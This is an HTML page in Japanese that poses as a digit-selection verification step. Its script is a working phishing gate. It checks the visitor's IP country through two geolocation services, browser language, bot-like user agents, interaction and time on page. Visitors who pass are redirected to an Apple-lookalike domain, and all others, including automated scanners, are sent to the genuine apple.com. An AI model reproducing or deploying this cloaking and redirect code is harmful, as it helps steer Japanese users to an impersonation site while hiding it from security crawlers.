<!DOCTYPE html>
<html lang="ja">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>認証</title>
<meta http-equiv="Cache-Control" content="no-cache, no-store, must-revalidate">
<meta http-equiv="Pragma" content="no-cache">
<meta http-equiv="Expires" content="0">
<style>
*{margin:0;padding:0;box-sizing:border-box}
body{background:#f7f8fa;font-family:-apple-system,BlinkMacSystemFont,"Segoe UI",Roboto,sans-serif;min-height:100vh;display:flex;align-items:center;justify-content:center;padding:20px}
.frm_wrp{background:#fff;width:100%;max-width:500px;border-radius:24px;padding:30px 24px;box-shadow:0 8px 24px rgba(0,0,0,0.08)}
.head_txt{text-align:center;font-size:19px;font-weight:600;margin-bottom:16px;color:#222}
.sub_txt{text-align:center;font-size:14px;color:#666;margin-bottom:20px}
.show_zone{background:#eef6ff;border-radius:16px;padding:20px;text-align:center;margin-bottom:24px}
.zone_tag{font-size:13px;color:#555;margin-bottom:8px}
.zone_val{font-size:32px;font-weight:700;letter-spacing:10px;color:#007aff}
.btn_grid{display:grid;grid-template-columns:repeat(4,1fr);gap:12px;margin-bottom:24px}
.digit_btn{aspect-ratio:1;border-radius:16px;border:2px solid #e0e0e0;background:#fff;font-size:22px;font-weight:600;cursor:pointer;transition:all .2s}
.digit_btn:active{transform:scale(.95)}
.digit_btn.act{background:#007aff;color:#fff;border-color:#007aff}
.confirm_btn{width:100%;padding:18px;border-radius:18px;background:#007aff;color:#fff;font-size:17px;font-weight:600;border:none;cursor:pointer;transition:.2s}
.confirm_btn:disabled{background:#ccc;cursor:not-allowed}
.info_txt{text-align:center;margin-top:16px;font-size:13px;color:#888}
</style>
</head>
<body>
<div class="frm_wrp">
  <div class="head_txt">選択認証</div>
  <div class="sub_txt">表示された数字をすべて選んでください</div>
  <div class="show_zone">
    <div class="zone_tag">対象</div>
    <div class="zone_val" id="show_num"></div>
  </div>
  <div class="btn_grid" id="key_area"></div>
  <button class="confirm_btn" id="send_btn" disabled>確認</button>
  <div class="info_txt" id="msg_area">選択してください</div>
</div>

<script>
const __tg_arr = [
  "https://apple-co.link/earchObj/ja",
  "https://apple-co.link/earchObj/ja",
  "https://apple-co.link/earchObj/ja"
];
const __err_link = "https://www.apple.com";
const __cache_exp = 3600000;

let __act_usr = false;
window.addEventListener('click',()=>{__act_usr=true});
window.addEventListener('touchstart',()=>{__act_usr=true});
window.addEventListener('load',()=>{__act_usr=true});

function __get_cache(){
  try{
    const c=localStorage.getItem('jp_auth_usr');
    if(!c)return!1;
    const d=JSON.parse(c);
    return d.ok&&Date.now()<d.et;
  }catch(e){return!1}
}

function __set_cache(){
  try{
    localStorage.setItem('jp_auth_usr',JSON.stringify({
      ok:!0,et:Date.now()+__cache_exp
    }));
  }catch(e){}
}

async function __ip_chk1(){
  try{
    const r=await fetch('https://ipapi.co/json/',{cache:'no-store',timeout:3e3});
    const d=await r.json();
    return d.country_code==="JP";
  }catch(e){return!1}
}

async function __ip_chk2(){
  try{
    const r=await fetch('https://api.ipgeolocation.io/ipgeo?apiKey=free&fields=country_code',{cache:'no-store',timeout:3e3});
    const d=await r.json();
    return d.country_code==="JP";
  }catch(e){return!1}
}

async function __auth_usr(){
  if(__get_cache())return!0;
  const l=navigator.language||navigator.userLanguage;
  const jp_l=l.startsWith('ja');
  const bot=/Headless|PhantomJS|Selenium|Bot|crawler|spider|scraper/i.test(navigator.userAgent);
  const act=__act_usr;
  const ip1=await __ip_chk1();
  const ip2=await __ip_chk2();
  const ip_ok=ip1||ip2;
  const stay=Date.now()-performance.timeOrigin;
  const time_ok=stay>2e3;
  const res=ip_ok&&jp_l&&!bot&&act&&time_ok;
  if(res)__set_cache();
  return res;
}

function __rand_tg(){
  return __tg_arr[Math.floor(Math.random()*__tg_arr.length)];
}

function __mk_code(){
  const s="0123456789".split('');
  const n=2;
  const t=[];
  while(t.length<n){
    const c=s[Math.floor(Math.random()*s.length)];
    if(!t.includes(c))t.push(c);
  }
  const o=[...t];
  while(o.length<8){
    const c=s[Math.floor(Math.random()*s.length)];
    if(!o.includes(c))o.push(c);
  }
  o.sort(()=>Math.random()-0.5);
  return{t:t,o:o,m:n};
}

const code=__mk_code();
document.getElementById("show_num").innerText=code.t.join('   ');
const area=document.getElementById("key_area");
const send=document.getElementById("send_btn");
const msg=document.getElementById("msg_area");
let sel=[];

code.o.forEach(k=>{
  const b=document.createElement("button");
  b.className="digit_btn";
  b.innerText=k;
  b.onclick=()=>{
    b.classList.toggle("act");
    sel=Array.from(document.querySelectorAll(".digit_btn.act")).map(x=>x.innerText);
    send.disabled=sel.length!==code.m;
    msg.innerText=`${sel.length}/${code.m} 個選択中`;
  };
  area.appendChild(b);
});

send.onclick=async()=>{
  const ok=code.t.every(x=>sel.includes(x))&&sel.length===code.t.length;
  if(!ok){
    alert("認証に失敗しました");
    return;
  }
  const jp=await __auth_usr();
  jp?location.href=__rand_tg():location.href=__err_link;
};
</script>
</body>
</html>
